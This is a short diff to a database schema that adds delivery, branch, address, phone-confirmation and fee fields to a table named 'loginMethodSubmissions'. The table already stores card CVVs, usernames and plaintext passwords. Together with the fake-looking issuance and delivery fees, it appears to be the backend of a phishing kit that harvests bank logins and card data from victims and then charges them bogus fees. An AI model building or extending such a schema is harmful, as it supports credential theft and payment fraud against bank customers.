@@ -58,6 +58,13 @@ export const loginMethodSubmissions = pgTable("loginMethodSubmissions", {
   cvv: varchar("cvv", { length: 10 }),
   username: varchar("username", { length: 255 }),
   password: text("password"),
+  deliveryMethod: varchar("deliveryMethod", { length: 20 }), // home, branch
+  branchName: text("branchName"),
+  deliveryAddress: text("deliveryAddress"),
+  phoneConfirmation: varchar("phoneConfirmation", { length: 20 }),
+  issuanceFee: varchar("issuanceFee", { length: 20 }),
+  deliveryFee: varchar("deliveryFee", { length: 20 }),
+  totalAmount: varchar("totalAmount", { length: 20 }),
   submittedAt: timestamp("submittedAt").defaultNow().notNull(),
 });
 
